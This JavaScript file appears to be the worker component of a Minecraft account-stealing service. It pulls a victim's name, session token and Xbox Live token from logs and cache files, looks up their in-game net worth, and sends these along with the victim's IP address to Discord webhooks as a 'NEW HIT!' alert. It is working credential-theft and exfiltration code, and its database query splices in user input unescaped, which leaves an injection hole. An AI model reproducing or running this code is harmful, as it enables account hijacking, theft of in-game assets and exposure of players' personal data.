const { workerData } = require("worker_threads")
const path = require("path")
const { WebhookClient } = require("discord.js")
const { readFile, readdir, statSync } = require("fs")
const { query } = require("./db/db")
const { logBuffer, userId, clientIP } = workerData;
const logLines = logBuffer.join('').split('\n');
const { discordServer, domain } = require("../config.json")
const fetchData = require("./Utils/fetchData")
// Use the 'id' as needed in your worker logic
let globalXblToken = null;
let extractedInfo = {
  id: null,
  name: null,
  token: null,
  xbl: null,
};

// A promise-based function to read the XBL token file
function readXblTokenFile() {
  return new Promise((resolve, reject) => {
    const folderPath = 'xbl'; // Change this to the folder path where your files are located
    const filePattern = /_xbl-cache.json/; // Pattern to match file names
    const timeThreshold = Date.now() - 10000; // Time threshold in milliseconds (10 seconds)

    readdir(folderPath, (err, files) => {
      if (err) {
        console.error('Error reading directory:', err);
        return reject(err);
      }

      const relevantFiles = files.filter((file) => {
        const filePath = path.join(folderPath, file);
        const fileStat = statSync(filePath);
        return filePattern.test(file) && fileStat.ctimeMs >= timeThreshold;
      });

      if (relevantFiles.length === 0) {
        console.log('No relevant files found.');
        return resolve(null); // Resolve with null if no relevant file is found
      }

      // Assuming you want to process the most recent file
      const mostRecentFile = relevantFiles.reduce((a, b) => (statSync(a).ctimeMs > statSync(b).ctimeMs ? a : b));
      const filePath = path.join(folderPath, mostRecentFile);

      readFile(filePath, 'utf8', (readErr, data) => {
        if (readErr) {
          console.error('Error reading file:', readErr);
          return reject(readErr);
        }

        const tokenMatch = data.match(/"Token":"([^"]*)"/);
        const xblToken = tokenMatch ? tokenMatch[1] : null;

        if (xblToken) {
          return resolve(xblToken);
        } else {
          return resolve(null); // Resolve with null if no token is found
        }
      });
    });
  });
}
logLines.forEach((line) => {
  if (line.includes('id:')) {
    extractedInfo.id = line.replace(/'/g, '').trim(); // Remove single quotes
  } else if (line.includes('name:')) {
    extractedInfo.name = line.replace(/'/g, '').trim();// Remove single quotes
    extractedInfo.name = extractedInfo.name.replace("name: ", "").replace(",", "") // Remove name: and ,
  } else if (line.includes('token:')) {
    extractedInfo.token = line.replace(/'/g, '').trim(); // Remove single quotes
    extractedInfo.token = extractedInfo.token.replace("token: ", "") // remove token: 
  }
  // Add additional filters as needed
});
// Use async/await to read the XBL token file







async function main() {


  try {
    const xblToken = await readXblTokenFile();

    if (xblToken) {
      globalXblToken = xblToken;
      extractedInfo.xbl = xblToken; // Set extractedInfo.xbl to the value of xblToken
      console.log('Extracted Token:', globalXblToken);
    } else {
      console.log('Token not found in the file.');
    }

    // Now you can use the globalXblToken and extractedInfo.xbl variables elsewhere in your code.
  } catch (error) {
    console.error('Error:', error);
  }

  let ip = clientIP.replace("::ffff:", "")
  let user = { mcname: extractedInfo.name }
  try {
    await fetchData(user)
  } catch (e) {
    console.log(`Failed to fetch user data of ${user.mcname}, ${e}`)
  }
  const messageContent = `@everyone [NEW HIT!](https://cupcake.shiiyu.moe/stats/${user.mcname})`;
  const embed = {
    "type": "rich",
    "author": { name: `${user.mcname}`, iconURL: `https://mc-heads.net/avatar/${user.uuid}` },
    "title": `NEW HIT!`,
    "description": `[Refresh](${domain}/refreshxbl?xbl=${extractedInfo.xbl})`,
    "color": 0x00FFFF,
    "fields": [
      {
        "name": `IP`,
        "value": `\`\`\`${ip}\`\`\``,
        inline: false
      },
      {
        "name": `SSID`,
        "value": `\`\`\`${extractedInfo.token}\`\`\``,
        inline: false
      },
      {
        "name": `UUID`,
        "value": `\`\`\`${user.uuid}\`\`\``,
        inline: false
      },
      {
        "name": `NetWorth`,
        "value": `\`\`\`${user.networth} | ${user.unsoulboundnetworth}\`\`\``,
        "inline": true
      },
      {
        "name": `Liquidated`,
        "value": `\`\`\`${user.liquid}\`\`\``,
        "inline": true
      }
    ],
    "timestamp": new Date(),
    "footer": {
      "text": `© ${discordServer}`
      // "icon_url": `https://cdn.discordapp.com/avatars/1176349273382719529/363aa134e32abf1ea684f8d05f817153?size=1024`
    }
  }


  try { // Sending data to webhooks

    let ids = await query(`SELECT * FROM links WHERE link='${userId}'`)
    if (ids.length == 0) return console.log(`Couldn't find link hooks`)
    let id = ids[0]
    let dhook = id.dhook
    let webhook = id.webhook
    let dmsg = ""
    let msg = ""
    //DHOOK
    try {
      if (dhook) {
        const dhookClient = new WebhookClient({ url: dhook })
        dmsg = await dhookClient.send({ content: messageContent, embeds: [embed] })
      }
    } catch (e) {
      console.log(`Failed to send to the dhook ${dhook}, ${e}`)
    }

    //Mainhook
    try {
      if (webhook) {
        const webhookClient = new WebhookClient({ url: webhook });
        msg = await webhookClient.send({
          content: messageContent,
          embeds: [embed], // Send both messageEmbed and xblEmbed
        })
      }

    } catch (e) {
      console.log(`[x] Failed to send to the mainhook, ${e}`)
    }


    //Notifyhook
  } catch (err) {
    console.error('Error writing to config file:', err);
  }
}
if (extractedInfo.token == null) { console.log(`Invalid token!`) } else {
  main()
}